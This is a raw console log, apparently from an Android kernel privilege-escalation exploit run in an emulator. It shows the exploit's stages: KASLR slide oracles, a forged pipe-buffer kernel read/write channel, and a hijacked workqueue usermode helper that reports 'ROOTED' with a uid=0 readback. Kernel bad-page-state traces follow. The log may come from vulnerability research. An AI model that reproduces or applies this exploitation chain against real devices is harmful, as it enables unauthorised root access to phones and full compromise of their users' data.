-rw-r--r--  1 user  staff  16363249 Aug 17 19:40 initramfs.cpio.gz
[33m[*] [0mpselect returned attempt=1 ret=4 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=4 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0mbootid oracle: restore verified
[33m[*] [0moracle slide: stackv=9ad4cac5c53a85a4 slide=9ad4cb0542ec85a4
[33m[*] [0mperf slide: page#0=ffffffc080022000 votes=1407 residue=22000
[33m[*] [0mperf slide: page#1=ffffffc080735000 votes=382 residue=135000
[33m[*] [0mperf slide: page#2=ffffffc0806f8000 votes=131 residue=f8000
[31m[-] [0mfuse-bringup: perf slide failed (att 2)
[33m[*] [0mDBG payload mode=0 cw=3 target=ffffff800281b920 cval=ffffff80026fcf70 pc=ffffff800281b918 right=ffffff80026fcf70 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff8021838000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff8021838000 fake_lock=ffffff8021838000 fake_w0=ffffff8021838300 fake_task=ffffff8021838400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff8021838400 ex3=ffffff8021838000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=4
[33m[*] [0mpselect returned attempt=1 ret=4 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=4 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0moracle window text: 18b98102-80ff-ffff-a485-3ac5c5cad49a
[33m[*] [0mDBG payload mode=0 cw=3 target=ffffff800281b920 cval=ffffff8002a204f0 pc=ffffff800281b918 right=ffffff8002a204f0 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff8017148000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff8017148000 fake_lock=ffffff8017148000 fake_w0=ffffff8017148300 fake_task=ffffff8017148400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff8017148400 ex3=ffffff8017148000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=4
[33m[*] [0mpselect returned attempt=1 ret=4 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=4 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0mbootid oracle: restore verified
[33m[*] [0moracle slide: stackv=9ad4cac5c53a85a4 slide=9ad4cb0542ec85a4
[33m[*] [0mperf slide: page#0=ffffffc080022000 votes=1532 residue=22000
[33m[*] [0mperf slide: page#1=ffffffc080735000 votes=365 residue=135000
[33m[*] [0mperf slide: page#2=ffffffc080037000 votes=112 residue=37000
[31m[-] [0mfuse-bringup: perf slide failed (att 3)
[33m[*] [0mrwf fdmove pipe0: 4096 -> 4096
[32m[+] [0mpipebuf_page_base=ffffff8003bb8000
[33m[*] [0mrwforge: no-punch prime round
[33m[*] [0mDBG payload mode=0 cw=3 target=0000000000000000 cval=ffffff8016308100 pc=fffffffffffffff8 right=0000000000000000 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff8016308000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff8016308000 fake_lock=ffffff8016308000 fake_w0=ffffff8016308300 fake_task=ffffff8016308400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff8016308400 ex3=ffffff8016308000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=0 success=0 delay=100000
[33m[*] [0mpselect route done calls=0 success=0 step=33 errno=0
[33m[*] [0mDBG payload mode=0 cw=3 target=ffffff8003bb8000 cval=ffffff8024290100 pc=ffffff8003bb7ff8 right=fffffffec090a400 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff8024290000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff8024290000 fake_lock=ffffff8024290000 fake_w0=ffffff8024290300 fake_task=ffffff8024290400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff8024290400 ex3=ffffff8024290000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=2
[33m[*] [0mpselect returned attempt=1 ret=2 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=2 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0mrwf scan map-a0 owner pipe=19 byte=00
[33m[*] [0mDBG payload mode=0 cw=3 target=ffffff8003bb8800 cval=ffffff8022598100 pc=ffffff8003bb87f8 right=fffffffec0896600 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff8022598000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff8022598000 fake_lock=ffffff8022598000 fake_w0=ffffff8022598300 fake_task=ffffff8022598400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff8022598400 ex3=ffffff8022598000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=2
[33m[*] [0mpselect returned attempt=1 ret=2 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=2 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0mrwf scan map-rd owner pipe=22 byte=00
[33m[*] [0mDBG payload mode=0 cw=3 target=ffffff8003bb8000 cval=fffffffec00eee00 pc=ffffff8003bb7ff8 right=fffffffec00eee00 left=0000000000000000 wtask=ffffffc0824fcf40
[33m[*] [0mDBG post-payload base=ffffff80086d0000
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff80086d0000 fake_lock=ffffff80086d0000 fake_w0=ffffff80086d0300 fake_task=ffffff80086d0400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000001 ex0=0000000000000001 ex1=0000000000000000 ex2=ffffff80086d0400 ex3=ffffff80086d0000
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +202ms ret=2
[33m[*] [0mpselect returned attempt=1 ret=2 errno=0 calls=1 success=1 delay=100000
[33m[*] [0mpselect route probing cfi attempt=1 ret=2 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0mrwf stage: retarget round done landed=1 (spray tracked=3)
[33m[*] [0mrwf stage: array pinned
[33m[*] [0mrwf stage: self-test read-verify begin
[33m[*] [0mrwf read peek=ff addr=ffffff80086d0230 slot=0
[33m[*] [0mrwf stage: self-test read-verify ok
[33m[*] [0mrwf stage: self-test write begin
[33m[*] [0mrwf write peek=52 (want 52) addr=ffffff80086d0c00 slot=1
[33m[*] [0mrwf stage: self-test write ok
[33m[*] [0mrwf stage: self-test read begin
[33m[*] [0mrwf read peek=52 addr=ffffff80086d0c00 slot=2
[32m[+] [0mrwforge physrw installed a0=19 rd=22
[32m[+] [0mrwforge channel up
[31m[-] [0mfuse-bringup: no file candidates
[31m[-] [0mfuse-fix: fuse stays armed
[33m[*] [0mwq-umh: begin
[33m[*] [0mrwf write peek=00 (want 00) addr=ffffff80086d1800 slot=3
[33m[*] [0mrwf write peek=2f (want 2f) addr=ffffff80086d1820 slot=4
[33m[*] [0mrwf write peek=61 (want 61) addr=ffffff80086d1840 slot=5
[33m[*] [0mrwf write peek=00 (want 00) addr=ffffff80086d1860 slot=6
[33m[*] [0mrwf read peek=d0 addr=ffffff800281b918 slot=7
[33m[*] [0mwq-umh: slide anchor procname: read=ffffffc0817cedd0 slide=0000000000000000 OK
[33m[*] [0mrwf read peek=f0 addr=ffffff800281b920 slot=8
[33m[*] [0mwq-umh: slide anchor data: read=ffffff8002a204f0 slide=ffffffbf80200000 reject
[33m[*] [0mrwf read peek=cc addr=ffffff800281b930 slot=9
[33m[*] [0mwq-umh: slide anchor proc_handler: read=ffffffc0809cd4cc slide=0000000000000000 OK
[32m[+] [0mwq-umh: channel slide=0000000000000000 via bootid ctl_table
[33m[*] [0mrwf read peek=a4 addr=ffffff80026fcf78 slot=10
[33m[*] [0mrwf read peek=00 addr=ffffff80026fd5d0 slot=11
[33m[*] [0mwq-umh: post-slide check init_task.stack=9ad4cac5c53a85a4 (expect ffffffc0824e0000) active_mm=0000000000000000 (expect ffffffc0825c1b80)
[33m[*] [0mrwf read peek=00 addr=ffffff80026eb810 slot=12
[33m[*] [0mrwf read peek=00 addr=ffffff8001a97238 slot=13
[33m[*] [0mrwf read peek=88 addr=ffffff8002c0aa00 slot=14
[33m[*] [0mrwf read peek=00 addr=ffffff8002c2be08 slot=15
[32m[+] [0mwq-umh: cpu_pwq via pwqs list walk: ffffff8002c2be00
[33m[*] [0mwq-umh: syswq=ffffff8002c0aa00 pco=ffffffbffd571000 (cpu_pwq DISCOVERY pass, cursor=2)
[33m[*] [0mrwf read peek=40 addr=ffffff8002c2be00 slot=16
[33m[*] [0mrwf read peek=68 addr=ffffff807fa3fd68 slot=17
[33m[*] [0mrwf read peek=00 addr=ffffff8002c2be10 slot=18
[33m[*] [0mrwf read peek=01 addr=ffffff8002c2be18 slot=19
[33m[*] [0mrwf write peek=05 (want 05) addr=ffffff80086d1700 slot=20
[33m[*] [0mrwf write peek=00 (want 00) addr=ffffff80086d1720 slot=21
[33m[*] [0mrwf write peek=00 (want 00) addr=ffffff80086d1740 slot=22
[33m[*] [0mrwf write peek=01 (want 01) addr=ffffff8002c2be1c slot=23
[33m[*] [0mrwf write peek=01 (want 01) addr=ffffff8002c2be60 slot=24
[33m[*] [0mrwf write peek=02 (want 02) addr=ffffff8002c2be18 slot=25
[33m[*] [0mrwf write peek=08 (want 08) addr=ffffff807fa3fd70 slot=26
[33m[*] [0mrwf write peek=08 (want 08) addr=ffffff807fa3fd68 slot=27
[32m[+] [0mwq-umh: queued on system_wq BOUND pool (pwq=ffffff8002c2be00 pool=ffffff807fa3fd40)
[33m[*] [0mwq-umh: queued — verifying link
[33m[*] [0mrwf read peek=08 addr=ffffff807fa3fd68 slot=28
[33m[*] [0mrwf read peek=ec addr=ffffff80086d1718 slot=29
[32m[+] [0mwq-umh: link verified
[33m[*] [0mwq-umh: repair inputs: afd=3 g_bringup_F=0000000000000000 fake_fops=ffffff80086d0100 page_base=ffffff80086d0000
[33m[*] [0mwq-umh: fdtable walk begin fd=3
[33m[*] [0mrwf read peek=00 addr=ffffff80026eb810 slot=30
[31m[-] [0mwq-umh: per_cpu_offset implausible ffffffbffd571000 — using 0
[33m[*] [0mrwf read peek=20 addr=ffffff80026d00d0 slot=31
[33m[*] [0mrwf read peek=00 addr=ffffff80026d00d0 slot=32
[31m[-] [0mrwf read stall at 1/8 errno=22 data=[00 ]
[31m[-] [0mrwf read drain failed addr=ffffff80026d00d0
[33m[*] [0mrwf read peek=00 addr=ffffff80026d00d0 slot=33
[31m[-] [0mrwf read stall at 1/8 errno=22 data=[00 ]
[31m[-] [0mrwf read drain failed addr=ffffff80026d00d0
[31m[-] [0mwq-umh: rq.curr read failed (rq=ffffff80026cf3c0 curr=6c61202c757a2500)
[31m[-] [0mwq-umh: fdtable: channel own-task failed, trying perf
[33m[*] [0mperf: opened fd=311
[33m[*] [0mperf: sampling begin
[33m[*] [0mperf: sampling done
[33m[*] [0mperf cand[0]: 0xffffff8004069440 (229/256 votes)
[33m[*] [0mperf cand[1]: 0xffffff8004069d50 (11/256 votes)
[33m[*] [0mperf cand[2]: 0xffffff8003d8e880 (4/256 votes)
[33m[*] [0mperf cand[3]: 0xffffff8005b36000 (3/256 votes)
[33m[*] [0mperf cand[4]: 0xffffff8002dc6d80 (3/256 votes)
[33m[*] [0mperf cand[5]: 0xffffff8004069e28 (2/256 votes)
[33m[*] [0mperf cand[6]: 0xffffff80058f8000 (1/256 votes)
[33m[*] [0mperf cand[7]: 0xffffff8002f9a000 (1/256 votes)
[33m[*] [0mrwf read peek=00 addr=ffffff8004069d80 slot=34
[31m[-] [0mrwf read stall at 1/8 errno=22 data=[00 ]
[31m[-] [0mrwf read drain failed addr=ffffff8004069d80
[31m[-] [0mwq-umh: fdtable: T=ffffff8004069440 bad files=0000000000000000
[31m[-] [0mwq-umh: fdtable walk failed — flag repair skipped
[31m[-] [0mwq-umh: flags repair failed/skipped
[33m[*] [0mwq-umh: triggering via ptmx storm
[33m[*] [0mrwf read peek=00 addr=ffffff807fa3fd68 slot=35
[31m[-] [0mrwf read stall at 1/8 errno=22 data=[00 ]
[31m[-] [0mrwf read drain failed addr=ffffff807fa3fd68
[31m[-] [0mwq-umh: link gone (head=0000000000000000) — re-queue (round 1/5)
[33m[*] [0mrwf write peek=00 (want 68) addr=ffffff80086d1708 slot=36
[33m[*] [0mrwf write peek=ff (want 68) addr=ffffff80086d1710 slot=37
[33m[*] [0mrwf write peek=ff (want ec) addr=ffffff80086d1718 slot=38
[33m[*] [0mrwf write peek=ff (want 08) addr=ffffff807fa3fd70 slot=39
[33m[*] [0mrwf write peek=80 (want 08) addr=ffffff807fa3fd68 slot=40
[33m[*] [0mrwf read peek=08 addr=ffffff80086d1744 slot=41
[31m[-] [0mrwf read stall at 6/8 errno=22 data=[08 80 ff ff ff 00 ]
[31m[-] [0mrwf read drain failed addr=ffffff80086d1744
[33m[*] [0mwq-umh: wake=1 complete=1 retval=-32760
[32m[+] [0mwq-umh: helper ran with init creds
[32m[+] [0mROOTED via wq-umh (init-creds helper)
[33m[*] [0mwq-umh: readback /data/local/tmp/a/umh_id.txt: No such file or directory
[33m[*] [0mwq-umh: readback /data/local/tmp/a/id.txt: No such file or directory
[33m[*] [0mwq-umh: readback /data/local/tmp/a/cmdline.txt: No such file or directory
[33m[*] [0mwq-umh: readback /data/local/tmp/a/pstore_ls.txt: No such file or directory
[33m[*] [0mwq-umh: readback /data/local/tmp/a/last_kmsg.txt: No such file or directory
[33m[*] [0mwq-umh: readback /data/local/tmp/cap/id.txt:
uid=0(root) gid=0(root) euid=0 egid=0 caps=unknown
[33m[*] [0m
wq-umh: readback /data/local/tmp/cap/id.txt done (51 bytes)
[33m[*] [0mcapture rc=0
[   21.976558][T16595] BUG: Bad page state in process e  pfn:4281b
[   21.976835][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4281b
[   21.977196][T16595] flags: 0x4000(reserved|zone=0|kasantag=0x0)
[   21.977446][T16595] raw: 0000000000004000 fffffffec00a06c8 fffffffec00a06c8 0000000000000000
[   21.977811][T16595] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   21.978166][T16595] page dumped because: PAGE_FLAGS_CHECK_AT_FREE flag(s) set
[   21.978463][T16595] Modules linked in:
[   21.978623][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G        W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   21.978626][T16595] Tainted: [W]=WARN
[   21.978626][T16595] Hardware name: linux,dummy-virt (DT)
[   21.978627][T16595] Call trace:
[   21.978627][T16595]  dump_backtrace+0xec/0x128
[   21.978631][T16595]  show_stack+0x18/0x28
[   21.978633][T16595]  dump_stack_lvl+0x40/0x88
[   21.978635][T16595]  dump_stack+0x18/0x24
[   21.978636][T16595]  bad_page+0x12c/0x134
[   21.978644][T16595]  free_page_is_bad_report+0x68/0xc8
[   21.978644][T16595]  free_unref_page+0x6e8/0x6f4
[   21.978646][T16595]  __folio_put+0xa4/0xd4
[   21.978650][T16595]  anon_pipe_buf_release+0x68/0xc4
[   21.978653][T16595]  free_pipe_info+0x94/0xf4
[   21.978653][T16595]  pipe_release+0xf4/0x110
[   21.978654][T16595]  __fput+0xac/0x290
[   21.978655][T16595]  ____fput+0x14/0x24
[   21.978656][T16595]  task_work_run+0xc0/0xe4
[   21.978657][T16595]  do_exit+0x264/0xa6c
[   21.978659][T16595]  trace_android_vh_do_group_exit+0x0/0x84
[   21.978659][T16595]  get_signal+0x768/0x870
[   21.978660][T16595]  do_signal+0xdc/0x5e4
[   21.978662][T16595]  do_notify_resume+0x64/0x120
[   21.978662][T16595]  el0_interrupt+0x84/0xd4
[   21.978664][T16595]  __el0_irq_handler_common+0x18/0x28
[   21.978665][T16595]  el0t_64_irq_handler+0x10/0x1c
[   21.978665][T16595]  el0t_64_irq+0x1a8/0x1ac
[   21.978666][T16595] Disabling lock debugging due to kernel taint
[   21.984233][T16595] BUG: Bad page state in process e  pfn:426fc
[   21.984475][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x426fc
[   21.984825][T16595] flags: 0x4000(reserved|zone=0|kasantag=0x0)
[   21.985074][T16595] raw: 0000000000004000 fffffffec009bf08 fffffffec009bf08 0000000000000000
[   21.985417][T16595] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   21.985772][T16595] page dumped because: PAGE_FLAGS_CHECK_AT_FREE flag(s) set
[   21.986069][T16595] Modules linked in:
[   21.986225][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G    B   W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   21.986226][T16595] Tainted: [B]=BAD_PAGE, [W]=WARN
[   21.986226][T16595] Hardware name: linux,dummy-virt (DT)
[   21.986226][T16595] Call trace:
[   21.986227][T16595]  dump_backtrace+0xec/0x128
[   21.986228][T16595]  show_stack+0x18/0x28
[   21.986230][T16595]  dump_stack_lvl+0x40/0x88
[   21.986231][T16595]  dump_stack+0x18/0x24
[   21.986233][T16595]  bad_page+0x12c/0x134
[   21.986233][T16595]  free_page_is_bad_report+0x68/0xc8
[   21.986234][T16595]  free_unref_page+0x6e8/0x6f4
[   21.986235][T16595]  __folio_put+0xa4/0xd4
[   21.986236][T16595]  anon_pipe_buf_release+0x68/0xc4
[   21.986237][T16595]  free_pipe_info+0x94/0xf4
[   21.986237][T16595]  pipe_release+0xf4/0x110
[   21.986240][T16595]  __fput+0xac/0x290
[   21.986241][T16595]  ____fput+0x14/0x24
[   21.986242][T16595]  task_work_run+0xc0/0xe4
[   21.986243][T16595]  do_exit+0x264/0xa6c
[   21.986244][T16595]  trace_android_vh_do_group_exit+0x0/0x84
[   21.986245][T16595]  get_signal+0x768/0x870
[   21.986245][T16595]  do_signal+0xdc/0x5e4
[   21.986247][T16595]  do_notify_resume+0x64/0x120
[   21.986248][T16595]  el0_interrupt+0x84/0xd4
[   21.986248][T16595]  __el0_irq_handler_common+0x18/0x28
[   21.986249][T16595]  el0t_64_irq_handler+0x10/0x1c
[   21.986249][T16595]  el0t_64_irq+0x1a8/0x1ac
[   21.986250][T16595] BUG: Bad page state in process e  pfn:426fd
[   21.991829][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x426fd
[   21.992179][T16595] flags: 0x4000(reserved|zone=0|kasantag=0x0)
[   21.992422][T16595] raw: 0000000000004000 fffffffec009bf48 fffffffec009bf48 0000000000000000
[   21.992770][T16595] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   21.993113][T16595] page dumped because: PAGE_FLAGS_CHECK_AT_FREE flag(s) set
[   21.993404][T16595] Modules linked in:
[   21.993559][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G    B   W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   21.993560][T16595] Tainted: [B]=BAD_PAGE, [W]=WARN
[   21.993560][T16595] Hardware name: linux,dummy-virt (DT)
[   21.993561][T16595] Call trace:
[   21.993561][T16595]  dump_backtrace+0xec/0x128
[   21.993564][T16595]  show_stack+0x18/0x28
[   21.993565][T16595]  dump_stack_lvl+0x40/0x88
[   21.993566][T16595]  dump_stack+0x18/0x24
[   21.993568][T16595]  bad_page+0x12c/0x134
[   21.993568][T16595]  free_page_is_bad_report+0x68/0xc8
[   21.993569][T16595]  free_unref_page+0x6e8/0x6f4
[   21.993570][T16595]  __folio_put+0xa4/0xd4
[   21.993571][T16595]  anon_pipe_buf_release+0x68/0xc4
[   21.993572][T16595]  free_pipe_info+0x94/0xf4
[   21.993572][T16595]  pipe_release+0xf4/0x110
[   21.993573][T16595]  __fput+0xac/0x290
[   21.993573][T16595]  ____fput+0x14/0x24
[   21.993574][T16595]  task_work_run+0xc0/0xe4
[   21.993575][T16595]  do_exit+0x264/0xa6c
[   21.993576][T16595]  trace_android_vh_do_group_exit+0x0/0x84
[   21.993576][T16595]  get_signal+0x768/0x870
[   21.993577][T16595]  do_signal+0xdc/0x5e4
[   21.993578][T16595]  do_notify_resume+0x64/0x120
[   21.993579][T16595]  el0_interrupt+0x84/0xd4
[   21.993580][T16595]  __el0_irq_handler_common+0x18/0x28
[   21.993581][T16595]  el0t_64_irq_handler+0x10/0x1c
[   21.993581][T16595]  el0t_64_irq+0x1a8/0x1ac
[   21.999005][T16595] BUG: Bad page state in process e  pfn:426eb
[   21.999253][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x426eb
[   21.999620][T16595] flags: 0x4000(reserved|zone=0|kasantag=0x0)
[   21.999867][T16595] raw: 0000000000004000 fffffffec009bac8 fffffffec009bac8 0000000000000000
[   22.000214][T16595] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   22.000562][T16595] page dumped because: PAGE_FLAGS_CHECK_AT_FREE flag(s) set
[   22.000851][T16595] Modules linked in:
[   22.001006][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G    B   W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   22.001007][T16595] Tainted: [B]=BAD_PAGE, [W]=WARN
[   22.001007][T16595] Hardware name: linux,dummy-virt (DT)
[   22.001007][T16595] Call trace:
[   22.001007][T16595]  dump_backtrace+0xec/0x128
[   22.001009][T16595]  show_stack+0x18/0x28
[   22.001010][T16595]  dump_stack_lvl+0x40/0x88
[   22.001012][T16595]  dump_stack+0x18/0x24
[   22.001013][T16595]  bad_page+0x12c/0x134
[   22.001013][T16595]  free_page_is_bad_report+0x68/0xc8
[   22.001014][T16595]  free_unref_page+0x6e8/0x6f4
[   22.001015][T16595]  __folio_put+0xa4/0xd4
[   22.001016][T16595]  anon_pipe_buf_release+0x68/0xc4
[   22.001017][T16595]  free_pipe_info+0x94/0xf4
[   22.001017][T16595]  pipe_release+0xf4/0x110
[   22.001018][T16595]  __fput+0xac/0x290
[   22.001019][T16595]  ____fput+0x14/0x24
[   22.001020][T16595]  task_work_run+0xc0/0xe4
[   22.001021][T16595]  do_exit+0x264/0xa6c
[   22.001021][T16595]  trace_android_vh_do_group_exit+0x0/0x84
[   22.001022][T16595]  get_signal+0x768/0x870
[   22.001022][T16595]  do_signal+0xdc/0x5e4
[   22.001024][T16595]  do_notify_resume+0x64/0x120
[   22.001025][T16595]  el0_interrupt+0x84/0xd4
[   22.001025][T16595]  __el0_irq_handler_common+0x18/0x28
[   22.001026][T16595]  el0t_64_irq_handler+0x10/0x1c
[   22.001026][T16595]  el0t_64_irq+0x1a8/0x1ac
[   22.001027][T16595] BUG: Bad page state in process e  pfn:41a97
[   22.006836][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x41a97
[   22.007189][T16595] flags: 0x4000(reserved|zone=0|kasantag=0x0)
[   22.007434][T16595] raw: 0000000000004000 fffffffec006a5c8 fffffffec006a5c8 0000000000000000
[   22.007779][T16595] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   22.008144][T16595] page dumped because: PAGE_FLAGS_CHECK_AT_FREE flag(s) set
[   22.008450][T16595] Modules linked in:
[   22.008612][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G    B   W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   22.008613][T16595] Tainted: [B]=BAD_PAGE, [W]=WARN
[   22.008613][T16595] Hardware name: linux,dummy-virt (DT)
[   22.008613][T16595] Call trace:
[   22.008614][T16595]  dump_backtrace+0xec/0x128
[   22.008616][T16595]  show_stack+0x18/0x28
[   22.008617][T16595]  dump_stack_lvl+0x40/0x88
[   22.008619][T16595]  dump_stack+0x18/0x24
[   22.008620][T16595]  bad_page+0x12c/0x134
[   22.008621][T16595]  free_page_is_bad_report+0x68/0xc8
[   22.008622][T16595]  free_unref_page+0x6e8/0x6f4
[   22.008623][T16595]  __folio_put+0xa4/0xd4
[   22.008624][T16595]  anon_pipe_buf_release+0x68/0xc4
[   22.008625][T16595]  free_pipe_info+0x94/0xf4
[   22.008626][T16595]  pipe_release+0xf4/0x110
[   22.008626][T16595]  __fput+0xac/0x290
[   22.008627][T16595]  ____fput+0x14/0x24
[   22.008628][T16595]  task_work_run+0xc0/0xe4
[   22.008629][T16595]  do_exit+0x264/0xa6c
[   22.008630][T16595]  trace_android_vh_do_group_exit+0x0/0x84
[   22.008631][T16595]  get_signal+0x768/0x870
[   22.008631][T16595]  do_signal+0xdc/0x5e4
[   22.008633][T16595]  do_notify_resume+0x64/0x120
[   22.008634][T16595]  el0_interrupt+0x84/0xd4
[   22.008635][T16595]  __el0_irq_handler_common+0x18/0x28
[   22.008635][T16595]  el0t_64_irq_handler+0x10/0x1c
[   22.008636][T16595]  el0t_64_irq+0x1a8/0x1ac
[   22.008638][T16595] BUG: Bad page state in process e  pfn:42c0a
[   22.014305][T16595] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x42c0a
[   22.014655][T16595] head: order:0 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[   22.014993][T16595] flags: 0x40(head|zone=0|kasantag=0x0)
[   22.015212][T16595] page_type: f5(slab)
[   22.015369][T16595] raw: 0000000000000040 ffffff8002c01a00 dead000000000122 0000000000000000
[   22.015709][T16595] raw: 0000000000000000 0000000000100010 00000000f5000000 0000000000000000
[   22.016049][T16595] head: 0000000000000040 ffffff8002c01a00 dead000000000122 0000000000000000
[   22.016402][T16595] head: 0000000000000000 0000000000100010 00000000f5000000 0000000000000000
[   22.016751][T16595] head: 0000000000000000 0000000000000000 ffffffffffffffff 0000000000000000
[   22.017100][T16595] head: 0000000000000002 0000000000000000 00000000ffffffff 0000000000000000
[   22.017448][T16595] page dumped because: nonzero mapcount
[   22.017680][T16595] Modules linked in:
[   22.017837][T16595] CPU: 1 UID: 0 PID: 16595 Comm: e Tainted: G    B   W          6.12.23-android16-5-abA175FXXS3BZA5-4k #1 c6077d974cbca63cf225e74fc494b6eb46ef0256
[   22.017838][T16595] Tainted: [B]=BAD_PAGE, [W]=WARN
[   22.017838][T16595] Hardware name: linux,dummy-virt (DT)
[   22.017838][T16595] Call trace:
[   22.017838][T16595]  dump_backtrace+0xec/0x128
[   22.017840][T16595]  show_stack+0x18/0x28
[   22.017842][T16595]  dump_stack_lvl+0x40/0x88
[   22.017843][T16595]  dump_stack+0x18/0x24
